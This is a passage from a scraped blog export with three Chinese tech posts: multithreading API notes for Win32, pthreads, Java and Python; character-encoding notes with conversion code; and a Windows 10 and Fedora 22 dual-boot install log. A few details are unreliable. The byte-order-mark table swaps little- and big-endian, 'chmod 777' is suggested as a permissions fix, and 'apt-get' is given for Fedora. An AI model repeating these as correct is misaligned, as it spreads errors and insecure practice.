当多CPU或CPU多核心时，微观上线程也是并行的。 操作系统实现线程模式线程实现在用户空间下 每一个进程中都维护着一个线程表来追踪本进程中的线程，表中包含每个线程独占的资源，如栈，寄存器，状态等。当一个线程完成了其工作或等待需要被阻塞时，其调用系统过程阻塞自身，然后将CPU交由其它线程。 进程表由系统维护，操作系统只能看到进程，而不能看到线程。过去的操作系统大部分是这种实现方式，优势之一在于即使操作系统不支持线程，也可以通过库函数来支持线程。 优势： 在用户空间下进行进程切换的速度要远快于在操作系统内核中实现 在用户空间下实现线程使得程序员可以实现自己的线程调度算法。如进程可以实现垃圾回收器来回收线程。 当线程数量过多时，由于在用户空间维护线程表，不会占用大量的操作系统空间。 劣势： 当一个进程中的某一个线程进行系统调用时，比如缺页中断而导致线程阻塞，此时操作系统会阻塞整个进程，即使这个进程中其它线程还在工作。 假如进程中一个线程长时间不释放CPU，因为用户空间并没有时钟中断机制，会导致此进程中的其它线程得不到CPU而持续等待。 线程实现在操作系统中 操作系统知道线程的存在，线程表存在操作系统内核中。 所有可能阻塞线程的调用都以系统调用(System Call)的方式实现，相比在用户空间下实现线程造成阻塞的运行时调用(System runtime call)成本会高出很多。当一个线程阻塞时，操作系统可以选择将CPU交给同一进程中的其它线程，或是其它进程中的线程，而在用户空间下实现线程时，调度只能在本进程中执行，直到操作系统剥夺了当前进程的CPU。 线程回收利用：当一个线程需要被销毁时，仅修改标记位，而不是直接销毁其内容，当一个新的线程需要被创建时，也同样修改被“销毁”的线程标记位即可。 混合模式 将上述两种方式混合，用户空间中由进程管理自己的线程，操作系统内核中有一部分内核级别的线程。 多线程代码备忘C/C++Windows下的多线程创建线程 需要库文件 windows.h &nbsp;&nbsp;// for HANDLE process.h &nbsp;&nbsp;// for _beginthreadex() CreateThread（Windows提供的api接口） 12345678HANDLE CreateThread( LPSECURITY_ATTRIBUTES lpsa, DWORD cbStack, LPTHREAD_START_ROUTINE lpStartAddr, LPVOID lpvThreadParam, DWORD fdwCreate, LPDWORD lpIDThread); 参数解释： lpsa是安全属性结构，主要控制该线程句柄是否可为进程的子进程继承使用，默认使用NULL时表示不能继承。若想继承线程句柄，则需要设置该结构体，将结构体的bInheritHandle成员初始化为TRUE。 cbStack表示的线程初始栈的大小，若使用0则表示采用默认大小（1M）。 lpStartAddr表示线程执行的函数地址，多个线程可以使用同一个函数地址。 lpvThreadParam是传给线程函数的参数。 fdwCreate是控制线程的标志，CREATE_SUSPENDED表示线程创建后挂起暂不执行，直到调用ResumeThread()，0表示线程创建之后立即执行。 lpIDThread返回了线程的ID，传入NULL表示不需要返回。 CreateThread的返回值：成功返回新线程的句柄，失败返回NULL。示例： 123456789DWORD WINAPI ThreadTest(LPVOID pM)&#123; printf(\"CurrentThread:%d\\n\", GetCurrentThreadId()); return 0; &#125;int main()&#123; HANDLE handle = CreateThread(NULL,0,ThreadTest,NULL,0,NULL); WaitForSingleObject(handle,INFINITE); return 0; &#125; _beginthreadex 为什么要用_beginthreadex而不是CreateHandle?简单来说: _beginthreadex在内部调用了CreateThread，在调用CreateHandle之前_beginthreadex做了很多的工作，从而使得它比CreateThread更安全。——1999年7月MSJ的《Win32Q&amp;A》 这里有详细的原因 调用方法和CreateThread相同，需要强制类型转换，线程函数修改 123456789unsigned int __stdcall ThreadTest(PVOID pM)&#123; printf(\"CurrentThread:%d\\n\", GetCurrentThreadId()); return 0; &#125;int main()&#123; HANDLE handle = (HANDLE)_beginthreadex(NULL,0,ThreadTest,NULL,0,NULL); WaitForSingleObject(handle,INFINITE); return 0; &#125; 线程同步 多线程具有异步性。线程同步的主要任务是使并发执行的各线程之间能够有效的共享资源和相互合作，从而使程序的执行具有可再现性。同步包括互斥，互斥是一种特殊的同步。 事件Event CreateEvent 123456HANDLE CreateEvent( LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCTSTR lpName); 参数解释： 设定安全结构，默认NULL不能继承句柄。 确定事件为手动置位还是自动置位，TRUE表示手动置位，FALSE表示自动置位。自动置位时，对该事件调用WaitForSingleObject()后会自动调用ResetEvent()使事件变成未触发状态。 表示事件的初始状态，TRUR表示已触发。 事件名称，NULL表示匿名事件。 OpenEvent 12345HANDLE OpenEvent( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCTSTR lpName); 参数解释： 访问权限，一般使用EVENT_ALL_ACCESS。 事件句柄继承性，一般为TRUE。 事件名称，不同进程中的线程使用名称访问同一事件。 触发事件：BOOL SetEvent(HANDLE hEvent);重置事件：BOOL ResetEvent(HANDLE hEvent);销毁事件：CloseHandle(HANDLE hEvent); 事件脉冲：BOOL PulseEvent(HANDLE hEvent);此函数相当于先调用SetEvent()再立刻调用ResetEvent()，对于手动置位事件，所有正处于等待状态下线程都变成可调度状态，对于自动置位事件，所有正处于等待状态下线程只有一个变成可调度状态。函数不稳定，因为在调用时无法确定哪些线程正处于等待状态下。 Event同步的实例 12345678910111213141516171819202122#include &lt;stdio.h&gt;#include &lt;process.h&gt;#include &lt;windows.h&gt;int tickets = 10;HANDLE _Lock;unsigned int __stdcall Test(void *PM)&#123; int name = *(int *)PM; printf(\"This is thread %d which name is %d\\n\", GetCurrentThreadId(), name); SetEvent(_Lock); return 0; &#125;int main()&#123; HANDLE thrs[10]; _Lock = CreateEvent(NULL, FALSE, FALSE, NULL); //自动置位 for (int i = 0; i &lt; 10; i++)&#123; thrs[i] = (HANDLE)_beginthreadex(NULL, 0, Test, &amp;i, 0, NULL); WaitForSingleObject(_Lock, INFINITE); &#125; CloseHandle(_Lock); system(\"pause\"); return 0;&#125; 信号量Semaphore CreateSemaphore 123456HANDLE CreateSemaphore( LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, LONG lInitialCount, LONG lMaximumCount, LPCTSTR lpName); 参数解释： 安全控制，NULL不能继承句柄。 初始资源数量。 最大并发数量。 信号量名称，NULL为匿名信号量。 OpenSemaphore 12345HANDLE OpenSemaphore( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCTSTR lpName); 参数解释： 访问权限，一般使用SEMAPHORE_ALL_ACCESS。 信号量句柄继承性，一般使用TRUE。 名称。 ReleaseSemaphore 12345BOOL ReleaseSemaphore( HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount ); 参数解释： 信号量句柄。 资源增加个数，大于0，且不超过最大资源数。 用于传出之前的资源计数，NULL为不传出。当前资源数量大于0，表示信号量触发，等于0表示资源耗尽，信号量处于末触发。对信号量调用等待函数时，等待函数会检查信号量的当前资源计数，若大于0，减1后调用线程继续执行。一个线程可以多次调用等待函数来减小信号量。 实例：Dijkstra生产者消费者问题 线程互斥 多个线程必然共享某种资源，线程A在使用某资源时，其它需要使用该资源的线程都要等待。在一段时间内只允许一个线程访问的资源称为临界资源或独占资源，计算机中大多数物理设备，进程中的共享变量等待都是临界资源，它们要求被互斥的访问。进程中访问临界资源的代码称为临界区。（介绍来自MoreWindows） 原子操作Interlocked 参数自增：LONG__cdeclInterlockedIncrement(LONG volatile* Addend); 参数自减：LONG__cdeclInterlockedDecrement(LONG volatile* Addend); LONG__cdec InterlockedExchangeAdd(LONG volatile* Addend, LONG Value);反回运算后的值，第二个参数正负代表加减 LONG__cdeclInterlockedExchange(LONG volatile* Target, LONG Value);返回原来的值，value为新值 原子操作部分来自《MoreWindows：原子操作 Interlocked系列函数》，其中对例子中出错的原理解释有问题，原博中对自增语句的三条汇编代码进行了分析： 第一条汇编将变量的值从内存中读取到寄存器中，第二条汇编将寄存器中的值与1相加，计算结果仍存入寄存器中，第三条汇编将寄存器中的值写回内存中。由于线程执行的并发性，很可能线程A执行到第二局时，线程B开始执行，线程B将原来的值又写入寄存器中，这样线程A所主要计算的值就被线程B修改了。 实际上，线程有自己独立的寄存器集合，切换线程时会保护现场。真正的原因可能是：1.假如A执行到第二句切换到B，B执行结束后继续执行A，寄存器会恢复到A的值，将B覆盖。 2.A和B读取了同一个值，自增操作后存入内存，相当于只执行了一次。 关键段CRITICAL_SECTION Init：void InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection);销毁：void DeleteCriticalSection(LPCRITICAL_SECTION lpCriticalSection);进入：void EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection);离开：void LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection); CS关键段仅可用于互斥，不可用于同步。其在WinNT.h中声明，结构体定义为： 12345678typedef struct _RTL_CRITICAL_SECTION &#123; PRTL_CRITICAL_SECTION_DEBUG DebugInfo; LONG LockCount; LONG RecursionCount; HANDLE OwningThread; HANDLE LockSemaphore; DWORD SpinCount; &#125;RTL_CRITICAL_SECTION,*PRTL_CRITICAL_SECTION; 其中，第四个参数HANDLE OwningThread记录允许进入关键段的线程句柄，第三个参数RecursionCount表示拥有这个关键段的访问权限的线程对此关键段的获得次数，如果OwingThread记录的线程再次进入，EnterCriticalSection()函数会更新RecursionCount记录该线程进入的次数，并且立即让该线程进入。此时其它线程调用EnterCriticalSection()会被切换到等待状态，当LeaveCriticalSection()至当前拥有访问权限的线程进入次数为0时，系统会自动更新关键段并将等待中的线程换回可调度状态。 配合使用的旋转锁线程在访问和等待间切换需要较大开销，在EnterCriticalSection()时如果需要等待，线程会先使用spinlock循环一段时间，在此期间如果仍未获得进入权限才会被切换到等待状态。 另一种初始化关键段方法： 1234BOOL InitializeCriticalSectionAndSpinCount( LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount ); 修改关键段的旋转锁次数： 123DWORD SetCriticalSectionSpinCount( LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount); 一个关键段互斥举例 123456789101112131415161718192021222324252627#include &lt;stdio.h&gt;#include &lt;process.h&gt;#include &lt;windows.h&gt;int tickets = 10;CRITICAL_SECTION _Lock;unsigned int __stdcall Test(void *PM)&#123; char name = *(char*)PM; while (tickets &gt; 0)&#123; EnterCriticalSection(&amp;_Lock); if (tickets &gt; 0) printf(\"Thread:%c\\n Leaves:%d\\n\",name, tickets--); LeaveCriticalSection(&amp;_Lock); Sleep(100); &#125; return 0;&#125;int main()&#123; InitializeCriticalSection(&amp;_Lock); char tar[2] = &#123; 'A', 'B' &#125;; HANDLE _handleT[2]; _handleT[0] = (HANDLE)_beginthreadex(NULL, 0, Test, tar, 0, NULL); _handleT[1] = (HANDLE)_beginthreadex(NULL, 0, Test, tar+1, 0, NULL); WaitForMultipleObjects(2, _handleT, TRUE, INFINITE); DeleteCriticalSection(&amp;_Lock); system(\"pause\"); return 0; &#125; 互斥量Mutex CreateMutex 12345HANDLE CreateMutex( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCTSTR lpName ); 参数解释： 第一个参数是安全结构，默认NULL不能继承句柄。 第二个参数为FALSE时创建Mutex时不指定所有权，若为TRUE则指定为当前的创建线程ID为所有者，其他线程访问需要先ReleaseMutex。 第三个参数用于设置Mutex名，为NULL时表示是匿名互斥量。 OpenMutex 12345HANDLE OpenMutex( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCTSTR lpName); 参数解释： 访问权限，一般使用MUTEX_ALL_ACCESS。 互斥量句柄继承性，多为TRUE。 名称。一个进程中的线程创建互斥量后，其它进程中的线程可以通过该函数来使用该互斥量。 请求一个互斥量的访问权：WaitForSingleObject()释放一个互斥量的访问权：ReleaseMutex()销毁互斥量：CloseHandle() 互斥量是内核对象，和关键段一样，mutex会记录线程访问权限，因此mutex不能用于线程的同步。但互斥量可以处理多进程间各个线程的互斥，可以处理遗弃情况：当当前某个占有互斥量的线程在触发互斥量之前意外中止（遗弃），系统会自动将互斥量内部储存占有该互斥量的线程ID重置为0，并且递归计数器重置为0，选择一个等待状态的线程进行调度，此时这个被选中的线程的WaitForSingleObject()会返回WAIT_ABANDONED_0。 Linux下的多线程pthread_t库函数和编译脚本 pthread.h gcc/g++ filename.c/cpp -o thread -lpthread 遵循POSIX线程接口 线程创建 pthread_create 123456int pthread_create( pthread_t *thread, pthread_attr_t *attr, void *(*func)(void*), void *arg ); 参数解释： func为指向新线程运行函数的指针。 arg为传给func的参数。 返回值为0表示成功，错误返回errcode。 线程等待和结束 pthread_join 用来等待一个线程结束int pthread_join(pthread_t thread,void ** retval);其中thread为等待的进程，retval指向一个存储返回值的变量。一个线程不能被多个线程等待，否则第一个接收到信号的线程会成功返回，其它线程返回错误代码ESRCH。 pthread_exitextern void pthread_exit __P ((void *__retval)) __attribute__ ((__noreturn__));调用此函数线程自发结束 被动结束pthread_cancelint pthread_cancel(pthread_t thread);此函数调用成功返回0 线程同步互斥量pthread_mutex_t 初始化 赋值为常量PTHREAD_MUTEX_INITIALIZER 动态分配，pthread_mutex_init函数int pthread_mutex_init (pthread_mutex_t *__mutex,__const pthread_mutexattr_t *__mutexattr); 销毁 int pthread_mutex_destroy (pthread_mutex_t *__mutex); 上锁和解锁 12int pthread_mutex_lock (pthread_mutex_t *__mutex);int pthread_mutex_unlock (pthread_mutex_t *__mutex); 读写锁 适用：允许多个线程同时读取，但只能有一个线程写入。适用于读的次数远大于写的情况。 初始化和销毁 12int pthread_rwlock_init (pthread_rwlock_t *__restrict __rwlock,__const pthread_rwlockattr_t *__restrict __attr);int pthread_rwlock_destroy (pthread_rwlock_t *__rwlock); 成功返回值为0，否则为错误代码。 加锁和解锁 读加锁：int pthread_rwlock_rdlock (pthread_rwlock_t *__rwlock) 写加锁：int pthread_rwlock_wrlock (pthread_rwlock_t *__rwlock) 解锁：int pthread_rwlock_unlock (pthread_rwlock_t *__rwlock)，读写均用此函数 条件变量pthread_cond_t 一篇简洁的介绍《Linux线程同步-条件变量》和一段具体的使用了mutex和cond的代码《linux 多线程（条件变量） 》 Java创建线程继承Thread类 123456class classname extends Thread&#123; ... public void run()&#123; ... &#125; &#125; 实现Runnable接口 123456class classname implements Runnable&#123; ... public void run()&#123; ... &#125; &#125; 线程的生命周期 构造方法 Thread(); Thread(Runnable target); Thread(Runnable target,String name); Thread(String name);具体方法见 JDK API 1.6（百度网盘） 启动：void start(); 休眠：static void sleep(); 礼让：static void yield(); 详细方法见JDK API。 线程同步同步方法 对方法使用synchronized关键字修饰。java的每个对象都含有一个内置锁，使用此关键字修饰时内置锁会保护整个方法。public synchronized void methodname(){}调用方法前需要获得内置锁，否则处于阻塞状态。 可以修饰静态方法，此时调用静态方法会锁住整个类。 synchronized不同地方的使用方法 同步代码块 使用synchronized关键字修饰代码块。synchronized(object){}同步操作开销较高，要尽量减少同步内容，通常同步关键代码块。 特殊域变量volatile volatile关键字为域变量提供了一种免锁机制。使用该关键字时等于告诉虚拟机此域可能被其他线程更新，每次使用该域需要重新计算，不能使用寄存器中的值。 在需要同步的变量前加上volatile，不能修饰final变量。 重入锁 JavaSE5.0中加入java.util.concurrent。常用方法：ReentrantLock()lock()unlock() 示例： 123456789101112class Test &#123; private int origin = 10; private Lock xlock = new ReentrantLock(); public void func()&#123; xlock.lock(); try&#123; origin--; &#125;finally&#123; xlock.unlock(); &#125; &#125;&#125; ThreadLocal类 使用空间换时间的方式，为每个线程创建一个变量副本。 常用方法：ThreadLocal(),get(),initialValue(),set(T value)`，分别用于：创建一个线程本地变量，返回此线程当前副本中的值，返回副本初始值和设置当前副本值为value。 示例： 12345678910class Test &#123; private static ThreadLocal&lt;Integer&gt; origin = new ThreadLocal&lt;Integer&gt;()&#123; protected Integer initivalValue()&#123; return 10; &#125; &#125;; public void func()&#123; origin.set(origin.get()-1); &#125;&#125; Python12345678910import threadingclass YourThread(threading.Thread): def __init__(self): threading.Thread.__init__(self) # your code def run(self): # your codeinstance = YourThread()instance.start() 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/08/18/多线程编程备忘/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"线程","slug":"线程","permalink":"http://forec.github.io/tags/线程/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"Angry 的编码问题","slug":"ANSI-Unicode备忘","date":"2015-08-14T14:08:40.000Z","updated":"2016-11-05T11:02:10.000Z","comments":true,"path":"2015/08/14/ANSI-Unicode备忘/","link":"","permalink":"http://forec.github.io/2015/08/14/ANSI-Unicode备忘/","excerpt":"Unicode和ANSI编码的区别，URL中编码问题，C/C++/Java/Python对两种编码格式的转换","text":"Unicode和ANSI编码的区别，URL中编码问题，C/C++/Java/Python对两种编码格式的转换 Unicode和ANSI百科 Unicode (from Wiki)（中文：万国码、国际码、统一码、单一码）对世界上大部分的文字系统进行了整理、编码，使得电脑可以用更为简单的方式来呈现和处理文字。Unicode至今仍在不断增修，每个新版本都加入更多新的字符。目前最新的版本为2015年6月17日公布的8.0.0，已收入超过十万个字符。Unicode发展由非营利机构统一码联盟负责。 ANSI (from Baidu)为使计算机支持更多语言，通常使用 0x80~0xFF 范围的 2 个字节来表示 1 个字符。不同的国家和地区制定了不同的标准，由此产生了 GB2312、GBK、GB18030、Big5、Shift_JIS 等各自的编码标准。不同 ANSI 编码之间互不兼容，当信息在国际间交流时，无法将属于两种语言的文字，存储在同一段 ANSI 编码的文本中。ANSI 编码表示英文字符时用一个字节，表示中文用两个或四个字节。 编码：按照某种规则将文本转换为字节流 解码：将字节流按照某种规则转换为文本 表示Unicode实现方式 Unicode只是符号集，规定了符号的二进制代码，没有规定该二进制代码的存储方式。 UTF-8 UTF-16 UTF-32 非unicode字元集的UTF-7（提供了一种将Unicode转换为7位US-ASCII的方法：“direct characters”包含了 62 个数字与英文字母，以及包含了九个符号字元：’ ( ) , - . / : ?。这些“direct characters”被认为可以很安全的直接在文件里呈现。“optional direct characters”包含了所有可被列印的字元，这些字元在 U+0020 ～ U+007E 之间，除了~ \\ +和空白字元以外。空白字元、Tab字元、以及换行字元一般虽也可直接是为单一的 ASCII 字元来使用，然而，若是邮件中有使用了编码过的字串，则必须特别注意这些字元有无被使用在其他地方。其他的字元则必须被编码成 UTF-16 然后转换为修改的 Base64。这些区块的开头会以 + 符号来标示，结尾则以任何不在 Base64 里定义的字元来标示）。 UTF-8，UTF-16和UTF-32 UTF-8用1到6个字节编码UNICODE字符，现在已经标准化为RFC 3629。Unicode编码(0x) UTF-8 字节流(01)00000000 - 0000007F0xxxxxxx00000080 - 000007FF110xxxxx 10xxxxxx00000800 - 0000FFFF1110xxxx 10xxxxxx 10xxxxxx00010000 - 001FFFFF11110xxx 10xxxxxx 10xxxxxx 10xxxxxx00200000 - 03FFFFFF111110xx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx04000000 - 7FFFFFFF1111110x 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx 10xxxxxx （总结自）UTF-8根据字节中开头的bit标志来识别是该多少个字节做为一个单元来处理。 0xxxxxxx ，xx代表任意bit.就表示把一个字节作为一个单元，和ASCII一样.110xxxxx 10xxxxxx ，把两个字节作为一个单元。1110xxxx 10xxxxxx 10xxxxxx ，三个字节作为一个单元。 在文件的开头几个字节为编码标识，EF BB BF 表示UTF-8，FE FF 表示UTF-16。UTF-8需要判断每个字节中的开头标志信息，当某个字节在传送过程中出错，会导致后面的字节也会解析出错。而UTF-16不会判断开头标志，即使错也只会错一个字符，所以容错能力强。 1997年Unicode2.0加入UTF-32 UTF-32将所有的字符都用4个字节表示。UTF-8可以选择1至8个字节中的任一个来表示。UTF-16只能为两字节或四字节。 文本开头判断标志（16进制编辑） EF BB BF UTF-8FE FF UTF-16LE/UCS-2, little endianFF FE UTF-16BE/UCS-2, big endianFF FE 00 00 UTF-32LE/UCS-4, little endian00 00 FE FF UTF-32BE/UCS-4, big-endian 其中的UCS是ISO制定的标准，与Unicode完全相同。UCS-2对应UTF-16，UCS-4对应UTF-32。UTF-8无对应的UCS。 URL中的编码问题RFC 1738 Only alphanumerics [0-9a-zA-Z], the special characters “$-_.+!*’(),” [not including the quotes - ed], and reserved characters used for their reserved purposes may be used unencoded within a URL. 不同情况下的编码网址路径中存在非法字符 随机输入一个包含中文的网址 打开开发者工具可以看到http请求的头信息 测试的浏览器是firefox40.0，可以看到编码为UTF-8（图中E4 B8 AD E5 9C 8B为‘中国’的UTF-8编码） 发送的查询字符串中存在非法字符 在谷歌中搜索“火狐”，根据测试浏览器给出的编码方式仍然为UTF-8。但是根据查找的资料(引用)，这种情况下会使用操作系统的默认编码。测试系统为windows10，使用的默认编码不是GB2312而是UTF-8。在XP虚拟机中默认编码为GB2312，此时浏览器使用的编码方式为GB2312。 GET方法生成的URL存在非法字符 直接搬过来，没有测试 代码实现转换C语言/C++ ANSI：char，可用函数：strcat(),strcpy(),strlen()等，以str开头。UNICODE：wchar_t，可用函数：wcscat(),wcscpy(),wcslen()等，以wcs开头。详细介绍及系统支持 代码(需要win32API，原创在gakusei) Unicode -&gt; ANSI1234567891011121314151617181920212223string UnicodeToANSI( const wstring&amp; str )&#123; int iTextLen = WideCharToMultiByte( CP_ACP, 0, str.c_str(), -1, NULL, 0, NULL, NULL); char* pElementText = new char[iTextLen + 1]; memset((void*)pElementText,0,sizeof(char)*(iTextLen+1)); ::WideCharToMultiByte( CP_ACP, 0, str.c_str(), -1, pElementText, iTextLen, NULL, NULL); string strText = pElementText; delete[] pElementText; return strText;&#125; ANSI -&gt; Unicode123456789101112131415161718192021wstring ANSIToUnicode( const string&amp; str )&#123; int len = str.length(); int unicodeLen = ::MultiByteToWideChar( CP_ACP, 0, str.c_str(), -1, NULL, 0); wchar_t *pUnicode; pUnicode = new wchar_t[unicodeLen+1]; memset(pUnicode,0,(unicodeLen+1)*sizeof(wchar_t)); ::MultiByteToWideChar( CP_ACP, 0, str.c_str(), -1, (LPWSTR)pUnicode, unicodeLen ); wstring rt = (wchar_t*)pUnicode; delete pUnicode; return rt; &#125; UTF-8 -&gt; Unicode12345678910111213141516171819202122 wstring UTF8ToUnicode( const string&amp; str )&#123; int len = str.length(); int unicodeLen = ::MultiByteToWideChar( CP_UTF8, 0, str.c_str(), -1, NULL, 0); wchar_t *pUnicode; pUnicode = new wchar_t[unicodeLen+1]; memset(pUnicode,0,(unicodeLen+1)*sizeof(wchar_t)); ::MultiByteToWideChar( CP_UTF8, 0, str.c_str(), -1, (LPWSTR)pUnicode, unicodeLen ); wstring rt = ( wchar_t* )pUnicode; delete pUnicode; return rt; &#125; Unicode -&gt; UTF-81234567891011121314151617181920212223242526string UnicodeToUTF8( const wstring&amp; str )&#123; char* pElementText; int iTextLen; // wide char to multi char iTextLen = WideCharToMultiByte( CP_UTF8, 0, str.c_str(), -1, NULL, 0, NULL, NULL); pElementText = new char[iTextLen + 1]; memset((void*)pElementText,0,sizeof(char)*(iTextLen+1)); ::WideCharToMultiByte( CP_UTF8, 0, str.c_str(), -1, pElementText, iTextLen, NULL, NULL ); string strText = pElementText; delete[] pElementText; return strText;&#125; Java 将字符串按不同编码方式读取 12345678910111213String text = “TESTSTRING”;byte[] b_utf8 = text.getBytes(\"UTF-8\"); //utf-8byte[] b_iso88591 = text.getBytes(\"ISO8859-1\"); //isobyte[] b_gbk = text.getBytes(\"GBK\"); //ansistring unicode = getUnicode(text); //unicodepublic static String getUnicode(String source) &#123; String result = \"\"; for (int i = 0; i &lt; source.length(); i++) &#123; result += \"\\\\u\"+Integer.toHexString((int)source.charAt(i)); &#125; return result;&#125;//new String(str.getBytes(原编码),目标编码) 将ansi文件转为UTF-8 123456789101112131415161718192021 private static void transferFile(String srcFileName, String destFileName) throws IOException &#123; String line_separator = System.getProperty(\"line.separator\"); FileInputStream fis = new FileInputStream(srcFileName); StringBuffer content = new StringBuffer(); DataInputStream in = new DataInputStream(fis); BufferedReader d = new BufferedReader(new InputStreamReader(in, \"GBK\")); //源文件为GBK String line = null; while ((line = d.readLine()) != null) content.append(line + line_separator); d.close(); in.close(); fis.close(); Writer ow = new OutputStreamWriter(new FileOutputStream(destFileName),\"utf-8\"); ow.write(content.toString()); ow.close(); &#125;// line_separator可以通过另一种方式获取，上面的代码line_separator获取得系统默认编码的回车 byte[] sep=new byte[2]; sep[0]=0x0d; sep[1]=0x0a; String line_separator=new String(sep); Python获取系统默认编码123#coding=utf-8import sysprint sys.getdefaultencoding() 编码间转换通常通过Unicode作为中间编码 123str.decode('gb2312'); //将GB2312的字符串str转换为unicode编码str.encode('gb2312'); //将unicode字符串str转换为GB2312编码str.decode(\"ascii\").encode(\"utf-8\") //先解码再按utf-8编码 123import sysreload(sys)sys.setdefaultencoding('utf8') //设置默认编码 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/08/14/ANSI-Unicode备忘/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"字符编码","slug":"字符编码","permalink":"http://forec.github.io/tags/字符编码/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"Win10+Fedora22","slug":"Win10-Fedora22","date":"2015-08-08T07:29:50.000Z","updated":"2016-11-05T09:51:02.000Z","comments":true,"path":"2015/08/08/Win10-Fedora22/","link":"","permalink":"http://forec.github.io/2015/08/08/Win10-Fedora22/","excerpt":"摘要 双硬盘安装Win10+Fedora22双系统 硬盘mbr-&gt;gpt Fedora22安装后部分问题解决","text":"摘要 双硬盘安装Win10+Fedora22双系统 硬盘mbr-&gt;gpt Fedora22安装后部分问题解决 机器环境 联想小新V1000（2014.12停产） CPU：Intel 酷睿i7 4510U &nbsp;主频：2GHz最高睿频：3100MHz &nbsp;&nbsp;三级缓存：4M 内存：8G（原装4G+4G） 硬盘：金胜K300 64G SSD，希捷 1TB HDD 显卡：AMD R5M230 工具 Win10专业版ISO Fedora22 WORKSTATION ISO Windows USB-Tool（Windows7及以上版本U盘启动制作工具） Linux USB-Tool（Fedora U盘启动制作工具） 备份数据的移动硬盘 U盘 安装Win10 安装=有三个选项（1.保留个人数据和应用 2.仅保留个人数据 3.全清），选3，清理SSD空间（Win8.1下已用41G/59.6G）。 初始化 备份数据 用微软的工具把Win10映像写到U盘里 安装过程中可用序列号VK7JG-NPHTM-C97JM-9MPGT-3V66T 硬盘格式转换 启动选U盘进入Win10安装界面，不要点现在安装 按Shift+F10，调出管理员cmd 输入diskpart输入list disk，打印磁盘情况根据列出的磁盘代号输入select disk ？（？为需要转换格式的磁盘代号）屏幕打印：磁盘？现在是所选磁盘，输入clean清除磁盘数据输入convert gpt，屏幕打印：已将所选磁盘成功地更换为gpt格式叉掉窗口，重启。 Installing Win10略 进入Win10 格式化U盘，用unetbootin把Fedora22写到U盘里 win10自带了很多看起来很high的应用，比如微软小娜（被设成系统必须的一部分了，反正我是不知道怎么卸载掉，要是不信可以问问它能不能卸自己）。还有很多没有被设成系统必须Package的比如Person，Weather，Sport，Finance，占空间占资源。网上给了一种卸载这些鸡肋的方法： 管理员身份打开PowerShell输入Get-AppxPackage，会列出所有应用具体信息以删除“影片和视频”为例，name是ZuneVideo，把它对应的PackageFullName复制下来(Microsoft.ZuneVideo_2.6.434.0_x64__8wekyb3d8bbwe)输入Remove-AppxPackage PackageFullName，对于例子就是 Remove-AppxPackage Microsoft.ZuneVideo_2.6.434.0_x64\\__8wekyb3d8bbwe 请不要尝试上面的方法。若安装的 Win10 不是最新版本，更新会自动在后台安装，在联网后会自动下两个64bit系统的补丁和一个WindowsDefender的补丁，如果在这之前按上面的方法删掉了某个内置package，重启时会显示更新失败。将无法启动Taskmgr。 将所有软件重装后SSD空间24G/59.6G。 安装Fedora22安装前留出足够的未分配硬盘空间 BIOS的boot启动设置成Legacy Support（如果搜不到第二块硬盘） 安装过程Install to Disk，之后会让选键盘布局，语言，时间。主要选一下安装位置，如果是单硬盘没什么好说的，fedora会根据之前留下的未分配空间自动分配好，要是愿意可以选择“我要设置分区”自己调整。双硬盘会先选硬盘，再选空间。如果一个硬盘装一个系统，比如之前SSD已经装了Win10，就把两个都选上（Win10的/boot/efi/在SSD上），选分区时，/ ， /boot ， SWAP无谓，efi选SSD的efi分区。Grub会自己把Windows添加进去。默认不会创建任何用户，可以在安装过程中设置。 安装后按上面方式安装Win10+Fedora22，会由BIOS启动-&gt;Grub。进入BIOS，设置boot为uefi only，从uefi启动。 Fedora22 后续问题更改软件源 中科大开源软件镜像站 对应有ipv4和ipv6两个网址，分别在mirrors后面加4或6 北京理工大学镜像站(ipv4 only) 北京理工大学镜像站(ipv6 only) Fedora中文社区软件源（有不少方便的工具） 以及其它： 网易开源镜像站 搜狐开源镜像站 清华大学镜像站(ipv4+ipv6) 清华大学镜像站(ipv4 only) 清华大学镜像站(ipv6 only) 电子科技大学镜像站 北京交通大学(ipv4 only) 北京交通大学(ipv6 only) 兰州大学 Firefox同步 自带Firefox的同步为Firefox Sync插件，必须使用全球账户登录，如果发现自己的Firefox账户登录显示未注册，说明之前用的可能是本地账户。只能重新注册。 Firefox Flash插件 Fifefox无法播放视频，会提示安装Flash Player插件。选.rpm或者直接下载.tar.gz文件，解压,cd进去,文件夹内有/usr，libflashplayer.so等，cp libflashplayer.so /usr/lib/flash-plugin/，如果不存在flash-plugin目录先mkdir。执行下面代码(64bits系统) sudo ln /usr/lib/flash-plugin/libflashplayer.so /usr/lib64/mozilla/plugins/libflashplayer.so 如果没有权限先chmod 777。 输入法 默认在汉语分类里应该有一个intelligenct的pinyin输入，卡顿很严重。 可以添加上面的Fedora中文社区软件源装搜狗，sudo dnf install sogoupinyin 或者装ibus，sudo dnf install ibus，sudo dnf install ibus-sunpinyin 最好还是ibus，在retext（包括所有依赖qt5的工具）里，sogou可能没法用。 Wine和Steam 添加Fedora中文社区软件源以后可以sudo dnf install steam sudo apt-get install wine 